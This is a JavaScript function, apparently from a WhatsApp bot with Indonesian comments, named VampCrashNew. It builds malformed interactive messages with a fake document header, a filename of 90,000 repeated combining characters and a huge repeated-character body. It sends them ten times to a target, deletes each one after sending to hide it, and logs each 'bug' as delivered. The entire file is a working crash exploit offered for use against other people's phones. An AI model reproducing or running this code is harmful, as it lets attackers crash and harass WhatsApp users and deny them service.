// Function NusantaraBetaCrasher yang disesuaikan
async function VampCrashNew(sock, target) {
  const crashandro = "ु".repeat(90000);
  const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
      groupMentionedMessage: {
          message: {
              interactiveMessage: {
                  header: {
                      documentMessage: {
                          url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                          mimetype: "application/json",
                          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                          fileLength: "999999999999",
                          pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                          fileName: fileName,
                          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                          directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                          mediaKeyTimestamp: "1715880173"
                      },
                      hasMediaAttachment: true
                  },
                  body: { text: bodyText },
                  nativeFlowMessage: {
                      messageParamsJson: JSON.stringify({
                          name: "galaxy_message",
                          flow_action: "navigate", 
                          flow_action_payload: {screen: "CTZ_SCREEN"},
                          flow_cta: "🚀",
                          flow_id: "Apocalypse BvG Crash",
                          flow_message_version: "9.903",
                          flow_token: " Nando"
                      })
                  },
                  contextInfo: {
                      mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                      groupMentions: [{ groupJid: "1@newsletter", groupSubject: " UNiX " }]
                  }
              }
          }
      }
  }), { userJid: target });

  try {
      for (let i = 1; i <= 10; i++) {
          console.log(chalk.white.bold(`\n[${i}] Mengirim VampCrash ke ${target}`));
          
          const msg = await genMsg(`${crashandro}️`, "𑇂𑆵𑆴𑆿".repeat(9999));
          const result = await sock.relayMessage(target, msg.message, { 
              participant: { jid: target, count: 1 },
              messageId: msg.key.id 
          });

          // Hapus pesan setelah dikirim
          if (result?.key) {
              await sock.sendMessage(target, { delete: result.key });
          }
          
          console.log(chalk.green.bold(`[√] Berhasil mengirim VampCrash ${i}/8`));

          // Tambah jeda kecil antar pengiriman
          await new Promise(resolve => setTimeout(resolve, 500));
      }
      console.log(chalk.blue.bold(`\n[*] Semua 10 bug berhasil dikirim ke ${target}`));
  } catch (error) {
      console.error(chalk.red.bold(`\n[!] Terjadi error: ${error}`));
      throw error;
  }
}

